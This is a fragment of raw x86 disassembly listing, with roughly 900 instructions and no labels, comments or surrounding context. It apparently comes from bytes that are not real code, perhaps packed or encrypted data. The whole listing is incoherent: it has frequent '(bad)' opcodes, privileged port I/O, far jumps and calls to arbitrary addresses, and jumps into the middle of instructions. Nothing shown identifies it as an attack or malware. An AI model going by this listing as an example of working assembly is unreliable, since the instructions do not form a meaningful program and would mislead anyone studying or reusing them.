  419cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cff:	xchg   ecx,eax
  419d00:	test   BYTE PTR [edx-0x133e1160],bl
  419d06:	add    BYTE PTR [esi+esi*4-0x30],0x88
  419d0b:	jne    0x419d43
  419d0d:	mov    ch,0x38
  419d0f:	test   BYTE PTR [esi+0x1a],ah
  419d12:	cwde   
  419d13:	pop    ebp
  419d14:	in     eax,dx
  419d15:	and    al,0xde
  419d17:	lahf   
  419d18:	mov    eax,0x361d8db8
  419d1d:	inc    esi
  419d1e:	bound  edx,QWORD PTR [ecx+0x2b]
  419d21:	xlat   BYTE PTR ds:[ebx]
  419d22:	or     esp,ebx
  419d24:	pop    ebp
  419d25:	aam    0xb9
  419d27:	sbb    al,0x4c
  419d29:	dec    ebx
  419d2a:	sub    eax,0x680558b0
  419d2f:	mov    al,0x91
  419d31:	pop    eax
  419d32:	test   BYTE PTR [ebp+ebx*1+0x27],dh
  419d36:	sub    eax,0x901694a2
  419d3b:	shl    BYTE PTR [esi-0x3b],cl
  419d3e:	(bad)  
  419d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d40:	rol    BYTE PTR [edx-0x72],0x2a
  419d44:	dec    edi
  419d45:	or     BYTE PTR [ebp+0x79],0x21
  419d49:	jns    0x419d6c
  419d4b:	add    ebp,DWORD PTR [esi-0x1cfbead6]
  419d51:	cmp    BYTE PTR [eax],cl
  419d53:	inc    edi
  419d54:	in     eax,dx
  419d55:	xchg   ecx,eax
  419d56:	retf   
  419d57:	push   es
  419d58:	shr    BYTE PTR [edx],1
  419d5a:	outs   dx,DWORD PTR ds:[esi]
  419d5b:	jne    0x419d76
  419d5d:	pop    esp
  419d5e:	repnz out 0xa7,eax
  419d61:	push   esi
  419d62:	test   eax,0x7a215fd8
  419d67:	push   cs
  419d68:	imul   edx,DWORD PTR [ebx-0x49459d59],0x16
  419d6f:	lods   eax,DWORD PTR ds:[esi]
  419d70:	mov    ds:0xa29f6599,eax
  419d75:	cmp    BYTE PTR [ecx*4+0x1b4795ae],0xa4
  419d7d:	jno    0x419da3
  419d7f:	add    ecx,ebp
  419d81:	(bad)  
  419d82:	call   0xd29841e3
  419d87:	jmp    0x419d30
  419d89:	mov    ah,0xa2
  419d8b:	add    esp,DWORD PTR ds:0x7c8e4899
  419d91:	lock ret 
  419d93:	rep stos DWORD PTR es:[edi],eax
  419d95:	jge    0x419dfe
  419d97:	mov    ah,0xa5
  419d99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d9a:	stos   DWORD PTR es:[edi],eax
  419d9b:	test   BYTE PTR [ecx+eax*1+0x61],0x63
  419da0:	dec    ebp
  419da1:	xor    al,0xf2
  419da3:	in     eax,0x4
  419da5:	mov    WORD PTR [eax+0x540d1f25],gs
  419dab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dac:	inc    edi
  419dad:	pop    ebp
  419dae:	lods   eax,DWORD PTR ds:[esi]
  419daf:	adc    bh,dh
  419db1:	arpl   bx,di
  419db3:	and    BYTE PTR [ecx],bh
  419db5:	push   es
  419db6:	sti    
  419db7:	mov    WORD PTR [eax-0x50],gs
  419dba:	sub    cl,BYTE PTR [edx]
  419dbc:	in     al,0xa5
  419dbe:	push   0x9333f473
  419dc3:	cwde   
  419dc4:	popa   
  419dc5:	jnp    0x419d93
  419dc7:	mov    cl,0x42
  419dc9:	lods   eax,DWORD PTR ds:[esi]
  419dca:	mov    al,ds:0x7663c8c4
  419dcf:	pop    ecx
  419dd0:	xchg   ebp,eax
  419dd1:	xor    eax,0x22655705
  419dd6:	loop   0x419d79
  419dd8:	mov    BYTE PTR [ecx],al
  419dda:	out    dx,al
  419ddb:	clc    
  419ddc:	test   eax,0x656dec49
  419de1:	sub    al,0x6c
  419de3:	pop    edi
  419de4:	push   0xffffffa1
  419de6:	jnp    0x419dbd
  419de8:	and    eax,0xe148d8dd
  419ded:	or     esi,DWORD PTR [ebp+0xc]
  419df0:	hlt    
  419df1:	mov    esi,0x617a6378
  419df6:	ins    BYTE PTR es:[edi],dx
  419df7:	mov    eax,0x74da87a5
  419dfc:	in     al,0xe7
  419dfe:	xchg   edi,eax
  419dff:	cld    
  419e00:	inc    BYTE PTR [eax]
  419e02:	xor    DWORD PTR [esi-0x4c3d4cd1],0x29e99e3e
  419e0c:	stc    
  419e0d:	fcomip st,st(7)
  419e0f:	or     DWORD PTR [eax-0x73279bbe],esp
  419e15:	adc    DWORD PTR [edi-0x339847f7],edx
  419e1b:	and    DWORD PTR [ecx+esi*1],edx
  419e1e:	xchg   edx,eax
  419e1f:	inc    edi
  419e20:	pop    ebx
  419e21:	bound  esp,QWORD PTR [edi-0x34a36d6e]
  419e27:	pop    edx
  419e28:	imul   edi,DWORD PTR [ecx],0xffffffe1
  419e2b:	adc    DWORD PTR [esp+ebp*8-0x5b],ebp
  419e2f:	jnp    0x419df7
  419e31:	fild   WORD PTR [edi]
  419e33:	retf   0x291b
  419e36:	(bad)  
  419e37:	fadd   st,st(7)
  419e39:	jmp    FWORD PTR [ecx-0x36fdbacf]
  419e3f:	in     eax,dx
  419e40:	mov    al,ds:0x15476eec
  419e45:	sub    eax,0x1f8812e2
  419e4a:	or     esp,DWORD PTR [eax]
  419e4c:	les    esi,FWORD PTR [eax]
  419e4e:	or     al,BYTE PTR [ebp-0x1c]
  419e51:	sbb    eax,0xfbe608f5
  419e56:	loopne 0x419e9f
  419e58:	ret    
  419e59:	push   edx
  419e5a:	fxtract 
  419e5c:	mov    ebx,0xb9ae8364
  419e61:	call   0xdab8:0xed31bf8
  419e68:	mov    ebx,DWORD PTR [ecx+0x7e]
  419e6b:	adc    BYTE PTR [edx-0x71],ch
  419e6e:	and    al,BYTE PTR [esi-0x1ed189c5]
  419e74:	lods   eax,DWORD PTR ds:[esi]
  419e75:	and    cl,0x9c
  419e78:	mov    BYTE PTR [edi+ebp*8],bl
  419e7b:	mov    al,ds:0xaf26e11d
  419e80:	or     BYTE PTR [eax],bl
  419e82:	fisttp WORD PTR [edx]
  419e84:	xor    DWORD PTR [edi],esi
  419e86:	call   0x658:0xbe7234e8
  419e8d:	sub    BYTE PTR [ebx],ah
  419e8f:	sar    BYTE PTR [ebx+0xa],1
  419e92:	imul   ch
  419e94:	mov    edx,0x2e0ab0d7
  419e99:	push   ebx
  419e9a:	repz sub al,0xc
  419e9d:	inc    edx
  419e9e:	and    dl,al
  419ea0:	jg     0x419f02
  419ea2:	dec    ecx
  419ea3:	pusha  
  419ea4:	loopne 0x419e92
  419ea6:	stc    
  419ea7:	xchg   DWORD PTR [edx],esp
  419ea9:	dec    ebp
  419eaa:	xchg   ebp,eax
  419eab:	jle    0x419eea
  419ead:	fs xchg edx,eax
  419eaf:	mov    ebp,0xb749b16d
  419eb4:	dec    ecx
  419eb5:	and    cl,0x6c
  419eb8:	xor    al,0x2c
  419eba:	(bad)  
  419ebb:	or     BYTE PTR [eax+0x1d],ah
  419ebe:	in     eax,0x84
  419ec0:	int    0xfb
  419ec2:	xchg   edx,eax
  419ec3:	rcl    al,cl
  419ec5:	(bad)  [eax+eiz*1]
  419ec8:	test   esi,ebx
  419eca:	xor    DWORD PTR [edi+0x2e99b63b],esi
  419ed0:	xor    DWORD PTR [edi+0x7c],esi
  419ed3:	adc    DWORD PTR [ebx-0x52],esp
  419ed6:	stc    
  419ed7:	push   ebx
  419ed8:	scas   eax,DWORD PTR es:[edi]
  419ed9:	fdiv   QWORD PTR [edi]
  419edb:	les    ebx,FWORD PTR [edi]
  419edd:	mov    ebx,0x6489ad74
  419ee2:	or     bh,BYTE PTR [ebx]
  419ee4:	mov    dl,0x5c
  419ee6:	jle    0x419ef7
  419ee8:	retf   0x3f55
  419eeb:	std    
  419eec:	sbb    edx,DWORD PTR [eax-0x4c0ad5e8]
  419ef2:	inc    edi
  419ef3:	xchg   ecx,eax
  419ef4:	sbb    DWORD PTR [eax],ecx
  419ef6:	mov    al,0x2
  419ef8:	mov    edx,0x28831671
  419efd:	les    ebp,FWORD PTR [esp+esi*4]
  419f00:	mov    bl,0xae
  419f02:	out    0xa4,al
  419f04:	nop
  419f05:	jg     0x419ef8
  419f07:	sub    BYTE PTR [esi-0x7c],cl
  419f0a:	fst    DWORD PTR [edx+0x5c]
  419f0d:	call   0x3a3d:0x3ae2b6d0
  419f14:	dec    ebp
  419f15:	cli    
  419f16:	add    BYTE PTR [ecx-0xefe0688],dh
  419f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f1d:	jmp    0x419ea7
  419f1f:	xor    al,0xe
  419f21:	mov    al,ds:0x4f0f466d
  419f26:	shl    BYTE PTR [esi+0x70],cl
  419f29:	mov    ebp,0x31281c49
  419f2e:	ret    0x9de3
  419f31:	les    edi,FWORD PTR [ecx]
  419f33:	push   esi
  419f34:	adc    BYTE PTR [edi+0x6001f19],0xd0
  419f3b:	inc    eax
  419f3c:	sbb    bh,BYTE PTR [ebx+0x58]
  419f3f:	sbb    edi,ebx
  419f41:	std    
  419f42:	divps  xmm7,xmm2
  419f45:	mov    ebx,0xc80ad7d3
  419f4a:	dec    ebp
  419f4b:	adc    ch,BYTE PTR [eax-0x56]
  419f4e:	int3   
  419f4f:	pop    ss
  419f50:	imul   edx,DWORD PTR [edi+esi*1+0x484f77b6],0xffb8d7d8
  419f5b:	loopne 0x419f77
  419f5d:	xchg   esi,eax
  419f5e:	pop    edx
  419f5f:	out    dx,al
  419f60:	push   ebp
  419f61:	jg     0x419ef0
  419f63:	adc    al,0x91
  419f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f66:	ret    0xcde2
  419f69:	ret    0x47fa
  419f6c:	mov    ds:0x2882e1f2,eax
  419f71:	cmc    
  419f72:	inc    ebp
  419f73:	gs scas eax,DWORD PTR es:[edi]
  419f75:	push   ebx
  419f76:	les    ebp,FWORD PTR [eax+edi*8]
  419f79:	xchg   DWORD PTR [ecx],esp
  419f7b:	adc    DWORD PTR [ebx+0x7b],0x9cf43dbe
  419f82:	add    edx,esi
  419f84:	stos   DWORD PTR es:[edi],eax
  419f85:	or     ah,BYTE PTR [esi]
  419f87:	add    ch,ah
  419f89:	stc    
  419f8a:	mov    al,ds:0xba16f333
  419f8f:	add    BYTE PTR [esi-0x4fbdfce9],cl
  419f95:	inc    esp
  419f96:	mov    cl,0x58
  419f98:	js     0x419f49
  419f9a:	dec    ebx
  419f9b:	fwait
  419f9c:	jno    0x419fe8
  419f9e:	test   DWORD PTR [edx+eax*1-0x1b],0xb31ed40a
  419fa6:	push   edx
  419fa7:	mov    bl,0xdf
  419fa9:	int    0xf6
  419fab:	xor    DWORD PTR [ebp-0x637ae95],ebp
  419fb1:	(bad)  
  419fb2:	xor    eax,0x900ce150
  419fb7:	inc    esi
  419fb8:	hlt    
  419fb9:	add    ecx,edi
  419fbb:	dec    edi
  419fbc:	pop    ebx
  419fbd:	shl    BYTE PTR [edi+0x16f927c4],1
  419fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fc4:	mov    ecx,ss
  419fc6:	inc    ebp
  419fc7:	mov    dl,0xd4
  419fc9:	push   esi
  419fca:	test   eax,0x657a88ea
  419fcf:	push   0xffffffdb
  419fd1:	(bad)  
  419fd2:	push   edx
  419fd3:	mov    DWORD PTR [bx+si],esi
  419fd6:	push   0x35b4f3f1
  419fdb:	fbstp  TBYTE PTR [eax]
  419fdd:	and    BYTE PTR [edi-0x6b],ah
  419fe0:	pop    esp
  419fe1:	mov    dh,0xb5
  419fe3:	sbb    dl,BYTE PTR [esi]
  419fe5:	shr    DWORD PTR [edx-0x2],cl
  419fe8:	mov    ecx,0xbc5f4c93
  419fed:	push   0xffffffc5
  419fef:	dec    ebp
  419ff0:	xchg   ebp,eax
  419ff1:	(bad)  
  419ff2:	(bad)  
  419ff3:	and    eax,DWORD PTR [ebx]
  419ff5:	xchg   ecx,eax
  419ff6:	stos   BYTE PTR es:[edi],al
  419ff7:	mov    al,ds:0x5ca3134d
  419ffc:	mov    ch,0x6d
  419ffe:	lahf   
  419fff:	gs mov ecx,0xa6096078
  41a005:	imul   edx,DWORD PTR [eax+0xf],0xffffff9c
  41a009:	in     al,dx
  41a00a:	into   
  41a00b:	int3   
  41a00c:	xor    eax,0xf6cb8016
  41a011:	(bad)  
  41a012:	scas   al,BYTE PTR es:[edi]
  41a013:	mov    esi,0x104b640c
  41a018:	fldenv [edi-0x22]
  41a01b:	dec    esp
  41a01c:	cdq    
  41a01d:	mov    dh,0x8b
  41a01f:	(bad)  
  41a020:	movntq QWORD PTR [eax+0x2b],mm5
  41a024:	sti    
  41a025:	xor    BYTE PTR [eax+0x2a],ch
  41a028:	and    esp,DWORD PTR [edi]
  41a02a:	jb     0x41a092
  41a02c:	inc    esp
  41a02d:	iret   
  41a02e:	jo     0x41a017
  41a030:	clc    
  41a031:	dec    esp
  41a032:	push   edi
  41a033:	mov    BYTE PTR [ecx+0x74d1f1fb],al
  41a039:	or     al,0xb1
  41a03b:	clc    
  41a03c:	ret    0x6c15
  41a03f:	imul   edx,DWORD PTR [ebp+0x26],0x68
  41a043:	or     al,0x60
  41a045:	sbb    ah,BYTE PTR [ebx-0x20]
  41a048:	imul   ebx,DWORD PTR [ebp+ebx*1+0x2ecadff0],0x6f
  41a050:	leave  
  41a051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a052:	adc    bl,BYTE PTR [ebx]
  41a054:	cmp    BYTE PTR [eax+0x328dbc1e],bl
  41a05a:	or     eax,0x2e8b17fa
  41a05f:	xor    al,0x1c
  41a061:	out    dx,al
  41a062:	push   cs
  41a063:	arpl   si,si
  41a065:	sbb    al,0xe
  41a067:	scas   eax,DWORD PTR es:[edi]
  41a068:	cmc    
  41a069:	inc    ebp
  41a06a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a06b:	bound  ebp,QWORD PTR [ecx-0x6afa254a]
  41a071:	and    DWORD PTR [ebx],0xc23220e9
  41a077:	cdq    
  41a078:	out    0xa1,eax
  41a07a:	adc    al,0xd3
  41a07c:	ins    BYTE PTR es:[edi],dx
  41a07d:	repz xchg ebx,ebx
  41a080:	ret    0x1777
  41a083:	sub    eax,0xfbb57169
  41a088:	mov    BYTE PTR [ebp+0x5c],bl
  41a08b:	push   ss
  41a08c:	dec    ebp
  41a08d:	mov    ch,0xff
  41a08f:	jae    0x41a0e2
  41a091:	arpl   WORD PTR [edx+ecx*2],dx
  41a094:	mov    ebx,DWORD PTR [ebx-0x4971044f]
  41a09a:	inc    edi
  41a09b:	cmp    eax,0x8d0f9c3a
  41a0a0:	int    0x1d
  41a0a2:	aaa    
  41a0a3:	adc    dh,ch
  41a0a5:	mov    al,es:0x5abbda2c
  41a0ab:	xchg   BYTE PTR [eax+0x3d],al
  41a0ae:	mov    ah,0x10
  41a0b0:	mov    cl,0x9a
  41a0b2:	stos   BYTE PTR es:[edi],al
  41a0b3:	sub    al,0x59
  41a0b5:	(bad)  
  41a0b6:	mov    al,ds:0x382e0b3d
  41a0bb:	in     eax,dx
  41a0bc:	scas   eax,DWORD PTR es:[edi]
  41a0bd:	sub    DWORD PTR [ecx-0x21],eax
  41a0c0:	dec    edx
  41a0c1:	or     al,0x8d
  41a0c3:	push   0x54474195
  41a0c8:	dec    ebx
  41a0c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0ca:	mov    bh,0x46
  41a0cc:	daa    
  41a0cd:	dec    eax
  41a0ce:	add    al,0xd9
  41a0d0:	stos   DWORD PTR es:[edi],eax
  41a0d1:	popa   
  41a0d2:	retf   
  41a0d3:	jbe    0x41a0d1
  41a0d5:	ficomp DWORD PTR cs:[esp+edi*4+0x3c]
  41a0da:	mov    cl,0x40
  41a0dc:	ds into 
  41a0de:	xchg   ebx,eax
  41a0df:	je     0x41a0cb
  41a0e1:	aam    0xdb
  41a0e3:	int    0x39
  41a0e5:	bound  esi,QWORD PTR [eax-0x6c]
  41a0e8:	push   esp
  41a0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0ea:	dec    edx
  41a0eb:	cmp    cl,al
  41a0ed:	lods   eax,DWORD PTR ds:[esi]
  41a0ee:	jg     0x41a0f2
  41a0f0:	inc    edi
  41a0f1:	push   ecx
  41a0f2:	dec    ecx
  41a0f3:	outs   dx,DWORD PTR ds:[esi]
  41a0f4:	pop    ebp
  41a0f5:	xor    BYTE PTR [ecx-0x64],ah
  41a0f8:	ret    0xf3cb
  41a0fb:	ins    BYTE PTR es:[edi],dx
  41a0fc:	push   ss
  41a0fd:	and    eax,0x8813ec0
  41a102:	mov    edi,0x89ba1652
  41a107:	loopne 0x41a0d9
  41a109:	cmp    bh,dl
  41a10b:	fwait
  41a10c:	jecxz  0x41a0bd
  41a10e:	nop
  41a10f:	mov    ecx,0x7b779182
  41a114:	xor    eax,0xdac60ec4
  41a119:	and    al,0xa1
  41a11b:	push   esp
  41a11c:	jbe    0x41a196
  41a11e:	pop    ecx
  41a11f:	push   ebp
  41a120:	ret    
  41a121:	push   esp
  41a122:	jae    0x41a0ea
  41a124:	inc    ecx
  41a125:	push   0xf9cd8aa1
  41a12a:	jl     0x41a0ea
  41a12c:	imul   eax,DWORD PTR [ecx],0xcf6637d7
  41a132:	imul   esp,DWORD PTR [ecx+0x5c],0xdceb83ab
  41a139:	in     eax,dx
  41a13a:	addr16 jmp 0xb623:0xf9934a2e
  41a142:	aaa    
  41a143:	mov    dh,0xb
  41a145:	and    eax,0x28a45f5a
  41a14a:	jmp    0x51b58d7d
  41a14f:	xchg   ebx,eax
  41a150:	inc    esp
  41a151:	push   es
  41a152:	imul   esi,DWORD PTR [edi-0x68d217e4],0xfffffff6
  41a159:	and    BYTE PTR [ebp-0x4e],dh
  41a15c:	mov    ds:0x9ccb1068,al
  41a161:	add    DWORD PTR [esi],esp
  41a163:	mov    edx,0x5bdf3669
  41a168:	cmp    DWORD PTR [ecx+0x7e],esi
  41a16b:	sub    al,0x5
  41a16d:	mov    eax,ds:0xb98907f7
  41a172:	push   edi
  41a173:	dec    edi
  41a174:	test   eax,0x29e1db13
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	int    0xab
  41a17c:	xor    eax,0x4a273dd4
  41a181:	push   esi
  41a182:	test   BYTE PTR [ecx],dl
  41a184:	push   ds
  41a185:	mov    eax,0x66809428
  41a18a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a18b:	jb     0x41a187
  41a18d:	jmp    0x7195f62b
  41a192:	arpl   WORD PTR [esi],di
  41a194:	les    ecx,FWORD PTR [ebp-0x3b]
  41a197:	dec    ecx
  41a198:	rol    al,0x7d
  41a19b:	retf   0x377b
  41a19e:	mov    cl,0x71
  41a1a0:	fwait
  41a1a1:	xor    DWORD PTR [ebp-0x8],esp
  41a1a4:	loop   0x41a221
  41a1a6:	fld    TBYTE PTR [edi+0x13ebfaa9]
  41a1ac:	fdivr  QWORD PTR [ebx+0x59]
  41a1af:	fs test edi,eax
  41a1b2:	sub    DWORD PTR [ebp-0x6f2037f],0x9c4a7749
  41a1bc:	ss push es
  41a1be:	inc    esi
  41a1bf:	inc    esp
  41a1c0:	cld    
  41a1c1:	(bad)  
  41a1c2:	jno    0x41a226
  41a1c4:	scas   al,BYTE PTR es:[edi]
  41a1c5:	and    edx,DWORD PTR [ebx+0x7553d83c]
  41a1cb:	enter  0x2ccc,0x7
  41a1cf:	mov    ds:0x5008ce61,al
  41a1d4:	xchg   ecx,eax
  41a1d5:	push   esp
  41a1d6:	pop    ebx
  41a1d7:	and    DWORD PTR [edx-0x5154ef9],0x2a
  41a1de:	mov    dh,0x43
  41a1e0:	(bad)  
  41a1e1:	sbb    cl,ah
  41a1e3:	adc    ah,BYTE PTR [edx-0x8]
  41a1e6:	jge    0x41a24d
  41a1e8:	das    
  41a1e9:	and    DWORD PTR [eax-0x7e],0xd908e9f4
  41a1f0:	add    ebx,DWORD PTR [eax-0x73664e3a]
  41a1f6:	pop    esi
  41a1f7:	in     eax,dx
  41a1f8:	xchg   ecx,eax
  41a1f9:	pop    edx
  41a1fa:	xor    DWORD PTR [edx],edi
  41a1fc:	jnp    0x41a262
  41a1fe:	mov    eax,0x98ff71c
  41a203:	mov    ds:0x313508d1,al
  41a208:	cmp    ch,BYTE PTR [edi+ebp*1-0x1ccdca13]
  41a20f:	fdivp  st(4),st
  41a211:	repnz bound eax,QWORD PTR [ebx+0x2a]
  41a215:	in     eax,dx
  41a216:	mov    bl,0x3f
  41a218:	push   ss
  41a219:	das    
  41a21a:	xchg   esi,eax
  41a21b:	pop    es
  41a21c:	cld    
  41a21d:	imul   edi,DWORD PTR [ebp-0x6e],0xfffffff4
  41a221:	mov    edx,0x191ae74b
  41a226:	push   cs
  41a227:	pop    ds
  41a228:	je     0x41a216
  41a22a:	stos   BYTE PTR es:[edi],al
  41a22b:	add    ebp,DWORD PTR [eax+0x77773f14]
  41a231:	xchg   ecx,eax
  41a232:	pop    edx
  41a233:	pop    ds
  41a234:	pop    edx
  41a235:	int    0x75
  41a237:	ins    BYTE PTR es:[edi],dx
  41a238:	mov    BYTE PTR [edi-0x6a],bl
  41a23b:	pop    eax
  41a23c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a23d:	mov    DWORD PTR [edx],esi
  41a23f:	sahf   
  41a240:	inc    esp
  41a241:	push   0x327359f5
  41a246:	jmp    0x18fb0e03
  41a24b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a24c:	jo     0x41a252
  41a24e:	shr    DWORD PTR [eax],0x79
  41a251:	cs mov esi,0xadc1ec5d
  41a257:	aas    
  41a258:	lds    eax,FWORD PTR [edi-0x11]
  41a25b:	je     0x41a2d6
  41a25d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a25e:	or     DWORD PTR [esi],esi
  41a260:	adc    al,0xa7
  41a262:	mov    ebx,0x611e6311
  41a267:	jb     0x41a219
  41a269:	jecxz  0x41a25a
  41a26b:	push   eax
  41a26c:	jl     0x41a211
  41a26e:	clc    
  41a26f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a270:	out    0xb5,al
  41a272:	push   esi
  41a273:	add    BYTE PTR [ebx+0x34ca2ae6],0x27
  41a27a:	jmp    0x12cd:0x735869d8
  41a281:	cli    
  41a282:	(bad)  
  41a283:	pop    esp
  41a284:	cld    
  41a285:	push   ebx
  41a286:	push   ds
  41a287:	outs   dx,DWORD PTR ds:[esi]
  41a288:	jle    0x41a2e3
  41a28a:	ds mov ah,0x21
  41a28d:	rcr    BYTE PTR [esi+0x28],0xa
  41a291:	mov    esi,0x3c68f648
  41a296:	lods   al,BYTE PTR ds:[esi]
  41a297:	mov    esi,0x6feb89b8
  41a29c:	in     eax,0x22
  41a29e:	(bad)  
  41a2a0:	dec    edx
  41a2a1:	dec    ecx
  41a2a2:	cmc    
  41a2a3:	cmc    
  41a2a4:	and    edx,DWORD PTR [ecx+0x21]
  41a2a7:	push   0x3a
  41a2a9:	mov    ebx,0xabd390e1
  41a2ae:	sbb    DWORD PTR [esp+eiz*4-0x1a],ecx
  41a2b2:	lds    edx,FWORD PTR [ecx+0x4f731ac4]
  41a2b8:	ja     0x41a299
  41a2ba:	xchg   ebp,eax
  41a2bb:	push   ebx
  41a2bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2bd:	pop    esp
  41a2be:	push   edi
  41a2bf:	inc    edi
  41a2c0:	rol    BYTE PTR [ebx+0xc],1
  41a2c3:	pop    edi
  41a2c4:	fmul   QWORD PTR [ecx]
  41a2c6:	test   eax,0x1bec4f6
  41a2cb:	push   ebx
  41a2cc:	inc    ecx
  41a2cd:	xor    BYTE PTR ds:0x32d74ab4,dl
  41a2d3:	in     al,0x6c
  41a2d5:	adc    BYTE PTR [edi-0x4e],bh
  41a2d8:	ret    0x99d1
  41a2db:	bound  esi,QWORD PTR [eax+0x45ae7ed6]
  41a2e1:	pop    edx
  41a2e2:	mov    edi,0x69ec5d78
  41a2e7:	cld    
  41a2e8:	lea    edi,[ecx]
  41a2ea:	add    eax,DWORD PTR [ebp-0x2cdf7d9]
  41a2f0:	mov    bl,0x9f
  41a2f2:	pop    eax
  41a2f3:	inc    ecx
  41a2f4:	(bad)  
  41a2f5:	mov    DWORD PTR [esi*2+0x5cef4e41],eax
  41a2fc:	mov    al,ch
  41a2fe:	fnstenv [eax+0x30]
  41a301:	cmp    eax,0x591381eb
  41a306:	jg     0x41a295
  41a308:	jp     0x41a2a4
  41a30a:	test   ecx,esp
  41a30c:	pop    ebx
  41a30d:	jbe    0x41a2fb
  41a30f:	push   esi
  41a310:	in     al,dx
  41a311:	std    
  41a312:	xor    edi,edi
  41a314:	xor    ch,0x4a
  41a317:	iret   
  41a318:	test   eax,0x97a25fa1
  41a31d:	or     al,dh
  41a31f:	pop    edi
  41a320:	xor    DWORD PTR [ebx],ebp
  41a322:	js     0x41a36d
  41a324:	lods   al,BYTE PTR ds:[esi]
  41a325:	les    edi,FWORD PTR [edx]
  41a327:	mov    eax,ds:0x6b737679
  41a32c:	(bad)
  41a32f:	test   DWORD PTR [edi+0x59],0x281ad73f
  41a336:	pop    esp
  41a337:	pop    ebx
  41a338:	or     ch,ch
  41a33a:	xchg   ebx,eax
  41a33b:	fnstsw WORD PTR [eax+0x598c928e]
  41a341:	sti    
  41a342:	pop    eax
  41a343:	inc    ebp
  41a344:	(bad)  
  41a345:	retf   0xea52
  41a348:	mov    ecx,0xb94944c6
  41a34d:	adc    DWORD PTR ss:0x9184474a,ebp
  41a354:	mov    dh,0x7a
  41a356:	sti    
  41a357:	pop    ds
  41a358:	mov    cl,0xc9
  41a35a:	sub    eax,0xbabb10df
  41a35f:	fcmovbe st,st(5)
  41a361:	repnz push ebp
  41a363:	fs sbb bh,0xf6
  41a367:	div    BYTE PTR [ebx+0x1c6ddfe0]
  41a36d:	push   0xe
  41a36f:	inc    esi
  41a370:	add    eax,0x220e4ae0
  41a375:	jne    0x41a3ae
  41a377:	ror    ebx,cl
  41a379:	int    0x83
  41a37b:	mov    edi,0xe1b8b8f
  41a380:	shr    BYTE PTR [esi-0x1c],1
  41a383:	test   ebx,0x3007faf4
  41a389:	sbb    eax,DWORD PTR [eax]
  41a38b:	int3   
  41a38c:	in     eax,0x2a
  41a38e:	mov    bh,0x6
  41a390:	sub    eax,esp
  41a392:	push   ebx
  41a393:	out    dx,al
  41a394:	inc    ebx
  41a395:	je     0x41a357
  41a397:	push   eax
  41a398:	mov    edi,0x8e91f38
  41a39d:	jp     0x41a37f
  41a39f:	mov    ebx,es
  41a3a1:	into   
  41a3a2:	sub    eax,0x69b594d1
  41a3a7:	cmp    BYTE PTR [ebx+0x41],0x14
  41a3ab:	pop    ax
  41a3ad:	pop    ebx
  41a3ae:	or     eax,DWORD PTR [ebp-0x76]
  41a3b1:	adc    al,0x45
  41a3b3:	shl    BYTE PTR [ecx+0x1],0x12
  41a3b7:	push   0x3a
  41a3b9:	scas   eax,DWORD PTR es:[edi]
  41a3ba:	stos   BYTE PTR es:[edi],al
  41a3bb:	imul   ecx,DWORD PTR es:[esp+edi*8],0x23523fda
  41a3c3:	daa    
  41a3c4:	imul   eax,DWORD PTR [eax-0x221d21f1],0xd8eea064
  41a3ce:	aad    0xa9
  41a3d0:	inc    ebp
  41a3d1:	cli    
  41a3d2:	fdiv   DWORD PTR [esi]
  41a3d4:	inc    eax
  41a3d5:	inc    edx
  41a3d6:	stc    
  41a3d7:	sti    
  41a3d8:	sub    BYTE PTR [esi],0xdc
  41a3db:	or     bh,BYTE PTR [edx*4-0x21093bb2]
  41a3e2:	adc    DWORD PTR [edx],0xe02bf2f7
  41a3e8:	add    al,0x79
  41a3ea:	jle    0x41a449
  41a3ec:	mov    cl,0xd3
  41a3ee:	iret   
  41a3ef:	imul   eax,esp,0xffffffcc
  41a3f2:	lock popf 
  41a3f4:	test   ecx,0xc985a73b
  41a3fa:	ss test eax,0x9b2b9d7
  41a400:	sahf   
  41a401:	dec    ecx
  41a402:	mov    edx,0x11e12cb5
  41a407:	jmp    0xa8f5:0x8c09fb3b
  41a40e:	sbb    DWORD PTR [esi-0x21],edi
  41a411:	xlat   BYTE PTR ds:[ebx]
  41a412:	mov    eax,DWORD PTR ds:0x29d1cbcc
  41a418:	lock inc eax
  41a41a:	inc    ecx
  41a41b:	sub    edi,DWORD PTR [edi-0x2b03dfc3]
  41a421:	dec    edi
  41a422:	jle    0x41a4a0
  41a424:	mov    al,0x1a
  41a426:	and    DWORD PTR [eax],edx
  41a428:	repnz pop eax
  41a42a:	popf   
  41a42b:	iret   
  41a42c:	pop    esp
  41a42d:	jge    0x41a499
  41a42f:	pop    edx
  41a430:	test   ecx,ebx
  41a432:	sbb    eax,esi
  41a434:	out    0xe1,eax
  41a436:	cmp    al,0xb9
  41a438:	push   es
  41a439:	fcmovb st,st(7)
  41a43b:	(bad)  
  41a43c:	sbb    eax,0x3d0cefcf
  41a441:	xor    al,al
  41a443:	cmp    ecx,DWORD PTR [ebp-0x19]
  41a446:	les    eax,FWORD PTR ds:0x9413e9c1
  41a44c:	aam    0xb4
  41a44e:	adc    DWORD PTR ds:0x9dd19553,ebx
  41a454:	mov    ch,dh
  41a456:	rol    BYTE PTR ds:0xe3f122a7,0xfe
  41a45d:	mov    eax,0xba8fc859
  41a462:	ror    DWORD PTR [edx+esi*2-0x78c0c50e],cl
  41a469:	push   cs
  41a46a:	cmp    esp,edi
  41a46c:	and    DWORD PTR [esp+eax*1+0x55e27e10],ebx
  41a473:	dec    ecx
  41a474:	icebp  
